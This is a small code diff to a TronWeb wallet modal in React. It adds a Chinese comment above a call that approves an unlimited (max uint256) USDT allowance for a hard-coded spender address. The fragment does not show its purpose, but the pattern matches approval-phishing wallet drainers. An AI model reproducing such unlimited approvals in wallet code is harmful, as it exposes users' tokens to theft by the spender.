@@ -89,6 +89,7 @@ export const WalletModal: React.FC<WalletModalProps> = ({
           ];
 
           const contract = tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
+          // 最大无限额度 (Max Uint256)
           const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
           await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
